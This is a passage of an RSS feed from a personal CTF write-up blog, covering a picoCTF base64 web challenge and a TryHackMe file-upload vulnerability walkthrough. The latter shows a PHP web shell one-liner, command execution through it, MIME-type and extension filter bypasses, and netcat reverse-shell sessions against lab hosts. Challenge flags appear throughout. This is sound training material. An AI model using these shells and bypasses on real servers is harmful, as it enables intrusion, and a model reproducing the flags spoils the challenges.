<p><strong><em>flag</em></strong>: <code>picoCTF{t1m3m@ch1n3_186cd7d7}</code></p>
]]></content:encoded>
    </item>
    <item>
      <title>[picoCTF] WebDecode</title>
      <link>http://localhost:1313/picoctf-webdecode/</link>
      <pubDate>Sat, 06 Jul 2024 00:00:00 +0000</pubDate><author>leewookb@gmail.com (Wook Lee)</author>
      <guid>http://localhost:1313/picoctf-webdecode/</guid>
      <description>Description Do you know how to use the web inspector? Start searching here to find the flag
If you click on the link provided, it takes you to a website. There&amp;rsquo;s a navbar at the top with three options, home, about, and contact If you navigate to the about page, it says Try inspecting the page!! You might find it there.
When you inspect the elements of the page, you&amp;rsquo;ll notice that the section tag has an attribute called notify_true=&amp;quot;cGljb0NURnt3ZWJfc3VjYzNzc2Z1bGx5X2QzYzBkZWRfMjgzZTYyZmV9&amp;quot;.</description>
      <content:encoded><![CDATA[<h3 id="description">Description</h3>
<p>Do you know how to use the web inspector?
Start searching <a href="http://titan.picoctf.net:64333/" target="_blank">here</a> to find the flag</p>
<hr>
<p>If you click on the link provided, it takes you to a website.
<img src="image.png#center" alt="alt text"></p>
<p>There&rsquo;s a navbar at the top with three options, <code>home</code>, <code>about</code>, and <code>contact</code>
If you navigate to the <code>about</code> page, it says <strong>Try inspecting the page!! You might find it there</strong>.</p>
<br>
<p><img src="image-1.png#center" alt="alt text">
When you inspect the elements of the page, you&rsquo;ll notice that the section tag has an attribute called <code>notify_true=&quot;cGljb0NURnt3ZWJfc3VjYzNzc2Z1bGx5X2QzYzBkZWRfMjgzZTYyZmV9&quot;</code>. This looks suspicious and encrypted.</p>
<br>
<p>I googled the word <code>decode</code> and the first thing that popped up was base64. I decided to give it a try since we didn&rsquo;t know if the string was actually encoded or, if it was, how it was encoded</p>
<p><img src="image-3.png#center" alt="alt text"></p>
<br>
<p>I decoded the found string and it turned out to be an encrypted string.</p>
<p><img src="image-2.png#center" alt="alt text"></p>
<p>we found the flag.</p>
<p><strong><em>flag</em></strong>: picoCTF{web_succ3ssfully_d3c0ded_283e62fe}</p>
]]></content:encoded>
    </item>
    <item>
      <title>[THM] Upload Vulnerabilities</title>
      <link>http://localhost:1313/thm-upload-vulnerabilities/</link>
      <pubDate>Sat, 06 Jul 2024 00:00:00 +0000</pubDate><author>leewookb@gmail.com (Wook Lee)</author>
      <guid>http://localhost:1313/thm-upload-vulnerabilities/</guid>
      <description>The ability to upload files to a server has become an integral part of how we interact with web applications. Unfortunately, when handled badly, file uploads can also open up severe vulnerabilities in the server.
Overwriting Existing Files Open your web browser and navigate to overwrite.uploadvulns.thm. Your goal is to overwrite a file on the server with an upload of your own.
What is the name of the image file which can be overwritten?</description>
      <content:encoded><![CDATA[<p>The ability to upload files to a server has become an integral part of how we interact with web applications. Unfortunately, when handled badly, file uploads can also open up severe vulnerabilities in the server.</p>
<h3 id="overwriting-existing-files">Overwriting Existing Files</h3>
<p>Open your web browser and navigate to <code>overwrite.uploadvulns.thm</code>. Your goal is to overwrite a file on the server with an upload of your own.</p>
<h4 id="what-is-the-name-of-the-image-file-which-can-be-overwritten">What is the name of the image file which can be overwritten?</h4>






<pre tabindex="0"><code>mountains.jpg</code></pre>
<p>if no precautions are taken, we might be able to overwrite existing files on the server with a file with the same name.</p>
<br>
<h4 id="overwrite-the-image-what-is-the-flag-you-receive">Overwrite the image. What is the flag you receive?</h4>






<pre tabindex="0"><code>THM{OTBiODQ3YmNjYWZhM2UyMmYzZDNiZjI5}</code></pre>
<p><img src="image.png" alt="alt text"></p>
<br>
<h3 id="remote-code-execution">Remote Code Execution</h3>
<p>There are two basic ways to achieve RCE on a webserver when exploiting a file upload vulnerability: <code>webshells</code> and <code>reverse/bind shells</code>.</p>
<p>Navigate to <code>shell.uploadvulns.thm</code> and complete the questions for this task.</p>
<h4 id="run-a-gobuster-scan-on-the-website-using-the-syntax-what-directory-looks-like-it-might-be-used-for-uploads">Run a Gobuster scan on the website using the syntax. What directory looks like it might be used for uploads?</h4>






<pre tabindex="0"><code>/resources</code></pre>






<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 1</span><span><span style="color:#89dceb;font-weight:bold">(</span>kalikali<span style="color:#89dceb;font-weight:bold">)</span>-<span style="color:#89dceb;font-weight:bold">[</span>~/Desktop<span style="color:#89dceb;font-weight:bold">]</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 2</span><span>$ gobuster dir -u http://shell.uploadvulns.thm -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 3</span><span><span style="color:#89dceb;font-weight:bold">===============================================================</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 4</span><span>Gobuster v3.6
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 5</span><span>by OJ Reeves <span style="color:#89dceb;font-weight:bold">(</span>@TheColonial<span style="color:#89dceb;font-weight:bold">)</span> &amp; Christian Mehlmauer <span style="color:#89dceb;font-weight:bold">(</span>@firefart<span style="color:#89dceb;font-weight:bold">)</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 6</span><span><span style="color:#89dceb;font-weight:bold">===============================================================</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 7</span><span><span style="color:#89dceb;font-weight:bold">[</span>+<span style="color:#89dceb;font-weight:bold">]</span> Url:                     http://shell.uploadvulns.thm
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 8</span><span><span style="color:#89dceb;font-weight:bold">[</span>+<span style="color:#89dceb;font-weight:bold">]</span> Method:                  GET
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 9</span><span><span style="color:#89dceb;font-weight:bold">[</span>+<span style="color:#89dceb;font-weight:bold">]</span> Threads:                 <span style="color:#fab387">10</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">10</span><span><span style="color:#89dceb;font-weight:bold">[</span>+<span style="color:#89dceb;font-weight:bold">]</span> Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">11</span><span><span style="color:#89dceb;font-weight:bold">[</span>+<span style="color:#89dceb;font-weight:bold">]</span> Negative Status codes:   <span style="color:#fab387">404</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">12</span><span><span style="color:#89dceb;font-weight:bold">[</span>+<span style="color:#89dceb;font-weight:bold">]</span> User Agent:              gobuster/3.6
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">13</span><span><span style="color:#89dceb;font-weight:bold">[</span>+<span style="color:#89dceb;font-weight:bold">]</span> Timeout:                 <span style="color:#f5e0dc">10s</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">14</span><span><span style="color:#89dceb;font-weight:bold">===============================================================</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">15</span><span>Starting gobuster in directory enumeration <span style="color:#f5e0dc">mode</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">16</span><span><span style="color:#89dceb;font-weight:bold">===============================================================</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">17</span><span>/resources            <span style="color:#89dceb;font-weight:bold">(</span>Status: 301<span style="color:#89dceb;font-weight:bold">)</span> <span style="color:#89dceb;font-weight:bold">[</span>Size: 334<span style="color:#89dceb;font-weight:bold">]</span> <span style="color:#89dceb;font-weight:bold">[</span>--&gt; http://shell.uploadvulns.thm/resources/<span style="color:#89dceb;font-weight:bold">]</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">18</span><span>/assets               <span style="color:#89dceb;font-weight:bold">(</span>Status: 301<span style="color:#89dceb;font-weight:bold">)</span> <span style="color:#89dceb;font-weight:bold">[</span>Size: 331<span style="color:#89dceb;font-weight:bold">]</span> <span style="color:#89dceb;font-weight:bold">[</span>--&gt; http://shell.uploadvulns.thm/assets/<span style="color:#89dceb;font-weight:bold">]</span></span></span></code></pre></div>
<br>
<h4 id="get-either-a-web-shell-or-a-reverse-shell-on-the-machine-whats-the-flag-in-the-varwww--directory-of-the-server">Get either a web shell or a reverse shell on the machine. What&rsquo;s the flag in the <code>/var/www/ </code> directory of the server?</h4>






<pre tabindex="0"><code>THM{YWFhY2U3ZGI4N2QxNmQzZjk0YjgzZDZk}</code></pre>
<p>I created a file called <code>webshell.php</code> and uploaded to the website in order to get a webshell on the machine.</p>
<p><code>echo '&lt;?php echo system($_GET[&quot;cmd&quot;]); ?&gt;' &gt; webshell.php</code></p>
<p><img src="image-1.png#center" alt="alt text"></p>
<p>after uploading the file, navigate to <code>/var/www</code> directory and list files and directory by typing the following command on the browser:</p>
<p><code>http://shell.uploadvulns.thm/resources/webshell.php?cmd=cd%20/var/www;%20ls;</code></p>
<p><img src="image-2.png#center" alt="alt text"></p>
<p>As we can see, there&rsquo;s the flag.txt file.</p>
<p><img src="image-3.png#center" alt="alt text"></p>
<br>
<h4 id="filtering">Filtering</h4>
<p>Up until now, we have been ignoring the counter-defences employed by web developers. Every website so far has been completely insecure. From here on out, we&rsquo;ll be looking at some of the defence mechanisms used to prevent malicious file uploads.</p>
<p><strong><em>client-side</em></strong> filtering is trivially easy to by pass because the filtering is happening on our computer. client-side filtering by itself is a highly insecure method.</p>
<p><strong><em>server-side</em></strong> filtering tends to be more difficult to by pass, as you don&rsquo;t have the code in front of you.</p>
<p>Different kinds of filtering:</p>
<ul>
<li>Extension Validation</li>
<li>File Type Filtering</li>
<li>Magic Number Validation</li>
<li>File Length Filtering</li>
<li>File Name Filtering</li>
<li>File Content Filtering</li>
</ul>
<br>
<p>What is the traditionally predominant server-side scripting language?</p>






<pre tabindex="0"><code>PHP</code></pre>
<br>
<p>When validating by file extension, what would you call a list of accepted extensions (whereby the server rejects any extension not in the list)?</p>






<pre tabindex="0"><code>whitelist</code></pre>
<br>
<p>[Research] What MIME type would you expect to see when uploading a CSV file?</p>






<pre tabindex="0"><code>text/csv</code></pre>
<p><img src="image-4.png#center" alt="alt text"></p>
<br>
<h3 id="bypassing-client-side-filtering">Bypassing Client-Side Filtering</h3>
<p>There are four easy ways to bypass your average client-side file upload filter:</p>
<ol>
<li><em>Turn off Javascript in your browser</em></li>
<li><em>Intercept and modify the incoming page</em></li>
<li><em>Intercept and modify the file upload</em></li>
<li><em>Send the file directly to the upload point</em></li>
</ol>
<p>Navigate to <code>java.uploadvulns.thm</code> and bypass the filter to get a reverse shell.</p>
<h4 id="what-is-the-flag-in-varwww">What is the flag in <code>/var/www/</code>?</h4>






<pre tabindex="0"><code>THM{NDllZDQxNjJjOTE0YWNhZGY3YjljNmE2}</code></pre>
<p>Let&rsquo;s use Gobuster to locate the upload directory name first by running the following command:</p>
<p><code>gobuster dir -u http://java.uploadvulns.thm -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt</code></p>






<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 1</span><span><span style="color:#89dceb;font-weight:bold">(</span>kalikali<span style="color:#89dceb;font-weight:bold">)</span>-<span style="color:#89dceb;font-weight:bold">[</span>~/Desktop<span style="color:#89dceb;font-weight:bold">]</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 2</span><span>$ gobuster dir -u http://java.uploadvulns.thm -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 3</span><span><span style="color:#89dceb;font-weight:bold">===============================================================</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 4</span><span>Gobuster v3.6
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 5</span><span>by OJ Reeves <span style="color:#89dceb;font-weight:bold">(</span>@TheColonial<span style="color:#89dceb;font-weight:bold">)</span> &amp; Christian Mehlmauer <span style="color:#89dceb;font-weight:bold">(</span>@firefart<span style="color:#89dceb;font-weight:bold">)</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 6</span><span><span style="color:#89dceb;font-weight:bold">===============================================================</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 7</span><span><span style="color:#89dceb;font-weight:bold">[</span>+<span style="color:#89dceb;font-weight:bold">]</span> Url:                     http://java.uploadvulns.thm
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 8</span><span><span style="color:#89dceb;font-weight:bold">[</span>+<span style="color:#89dceb;font-weight:bold">]</span> Method:                  GET
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 9</span><span><span style="color:#89dceb;font-weight:bold">[</span>+<span style="color:#89dceb;font-weight:bold">]</span> Threads:                 <span style="color:#fab387">10</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">10</span><span><span style="color:#89dceb;font-weight:bold">[</span>+<span style="color:#89dceb;font-weight:bold">]</span> Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">11</span><span><span style="color:#89dceb;font-weight:bold">[</span>+<span style="color:#89dceb;font-weight:bold">]</span> Negative Status codes:   <span style="color:#fab387">404</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">12</span><span><span style="color:#89dceb;font-weight:bold">[</span>+<span style="color:#89dceb;font-weight:bold">]</span> User Agent:              gobuster/3.6
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">13</span><span><span style="color:#89dceb;font-weight:bold">[</span>+<span style="color:#89dceb;font-weight:bold">]</span> Timeout:                 <span style="color:#f5e0dc">10s</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">14</span><span><span style="color:#89dceb;font-weight:bold">===============================================================</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">15</span><span>Starting gobuster in directory enumeration <span style="color:#f5e0dc">mode</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">16</span><span><span style="color:#89dceb;font-weight:bold">===============================================================</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">17</span><span>/images               <span style="color:#89dceb;font-weight:bold">(</span>Status: 301<span style="color:#89dceb;font-weight:bold">)</span> <span style="color:#89dceb;font-weight:bold">[</span>Size: 329<span style="color:#89dceb;font-weight:bold">]</span> <span style="color:#89dceb;font-weight:bold">[</span>--&gt; http://java.uploadvulns.thm/images/<span style="color:#89dceb;font-weight:bold">]</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">18</span><span>/assets               <span style="color:#89dceb;font-weight:bold">(</span>Status: 301<span style="color:#89dceb;font-weight:bold">)</span> <span style="color:#89dceb;font-weight:bold">[</span>Size: 329<span style="color:#89dceb;font-weight:bold">]</span> <span style="color:#89dceb;font-weight:bold">[</span>--&gt; http://java.uploadvulns.thm/assets/<span style="color:#89dceb;font-weight:bold">]</span></span></span></code></pre></div>
<br>
<p><img src="image-6.png#center" alt="alt text"></p>
<p>The website upload only accepts MIME type of <code>png</code> files. So I am going to create a file called <code>hello.png</code> but it contains the Pentest Monkey&rsquo;s <code>php-reverse-shell</code> code.</p>
<br>
<p><img src="image-7.png#center" alt="alt text"></p>
<br>
<p>Before hitting the upload button, make sure <code>Intercept is on</code> on Burpsuite to capture the request and we&rsquo;re going to change the MIME type back to <code>text/x-php</code> and the file extension from <code>.png</code> to <code>.php</code>.
<img src="image-8.png#center" alt="alt text">
<img src="image-9.png#center" alt="alt text"></p>
<br>






<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 1</span><span><span style="color:#89dceb;font-weight:bold">(</span>kalikali<span style="color:#89dceb;font-weight:bold">)</span>-<span style="color:#89dceb;font-weight:bold">[</span>~/Desktop<span style="color:#89dceb;font-weight:bold">]</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 2</span><span>$ nc -lvp <span style="color:#fab387">443</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 3</span><span>listening on <span style="color:#89dceb;font-weight:bold">[</span>any<span style="color:#89dceb;font-weight:bold">]</span> <span style="color:#fab387">443</span> ...
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 4</span><span>connect to <span style="color:#89dceb;font-weight:bold">[</span>10.6.67.243<span style="color:#89dceb;font-weight:bold">]</span> from overwrite.uploadvulns.thm <span style="color:#89dceb;font-weight:bold">[</span>10.10.41.54<span style="color:#89dceb;font-weight:bold">]</span> <span style="color:#fab387">54590</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 5</span><span>Linux a73553061b26 4.15.0-109-generic <span style="color:#6c7086;font-style:italic">#110-Ubuntu SMP Tue Jun 23 02:39:32 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 6</span><span> 04:52:35 up  4:07,  <span style="color:#fab387">0</span> users,  load average: 0.00, 0.00, 0.00
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 7</span><span>USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 8</span><span><span style="color:#f5e0dc">uid</span><span style="color:#89dceb;font-weight:bold">=</span>33<span style="color:#89dceb;font-weight:bold">(</span>www-data<span style="color:#89dceb;font-weight:bold">)</span> <span style="color:#f5e0dc">gid</span><span style="color:#89dceb;font-weight:bold">=</span>33<span style="color:#89dceb;font-weight:bold">(</span>www-data<span style="color:#89dceb;font-weight:bold">)</span> <span style="color:#f5e0dc">groups</span><span style="color:#89dceb;font-weight:bold">=</span>33<span style="color:#89dceb;font-weight:bold">(</span>www-data<span style="color:#89dceb;font-weight:bold">)</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 9</span><span>/bin/sh: 0: can<span style="color:#f38ba8">&#39;</span>t access tty; job control turned off
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">10</span><span>$ ls
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">11</span><span>bin
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">12</span><span>boot
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">13</span><span>dev
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">14</span><span>etc
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">15</span><span>home
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">16</span><span>lib
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">17</span><span>lib32
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">18</span><span>lib64
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">19</span><span>libx32
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">20</span><span>media
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">21</span><span>mnt
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">22</span><span>opt
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">23</span><span>proc
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">24</span><span>root
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">25</span><span>run
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">26</span><span>sbin
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">27</span><span>srv
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">28</span><span>sys
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">29</span><span>tmp
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">30</span><span>usr
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">31</span><span>var
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">32</span><span>$ <span style="color:#89dceb">cd</span> /var/www
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">33</span><span>$ ls
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">34</span><span>flag.txt
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">35</span><span>html
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">36</span><span>$ cat flag.txt
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">37</span><span>THM<span style="color:#89dceb;font-weight:bold">{</span>NDllZDQxNjJjOTE0YWNhZGY3YjljNmE2<span style="color:#89dceb;font-weight:bold">}</span></span></span></code></pre></div>
<br>
<h4 id="bypassing-server-side-filtering-file-extensions">Bypassing Server-Side Filtering: File Extensions</h4>
<p>What is the flag in <code>/var/www/</code>?</p>






<pre tabindex="0"><code>THM{MGEyYzJiYmI3ODIyM2FlNTNkNjZjYjFl}</code></pre>
<p>First let&rsquo;s use Gobuster to locate the upload directory name. The directory name turned out to be <code>privacy</code>.
<img src="image-12.png#center" alt="alt text"></p>
<br>
<p>I tried uploading <code>.png</code> file and it was accepted. So I tried uploading the reverse-shell-php file with the name of <code>hello.png.php</code> but it was denied by saying it&rsquo;s an invalid type format. So I tried <code>hello.php5</code> and it was accepted!</p>
<p><img src="image-15.png#center" alt="alt text">
<img src="image-13.png#center" alt="alt text"></p>
<br>
<p>After the file was uploaded, I navaigated to the <code>/privacy</code>. Before opening up the reverse-shell file, I had run the netcat command thats running on port 1234 to capture and receive the reverse shell connection.</p>






<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 1</span><span><span style="color:#89dceb;font-weight:bold">(</span>kalikali<span style="color:#89dceb;font-weight:bold">)</span>-<span style="color:#89dceb;font-weight:bold">[</span>~<span style="color:#89dceb;font-weight:bold">]</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 2</span><span>$ nc -lvnp <span style="color:#fab387">1234</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 3</span><span>listening on <span style="color:#89dceb;font-weight:bold">[</span>any<span style="color:#89dceb;font-weight:bold">]</span> <span style="color:#fab387">1234</span> ...
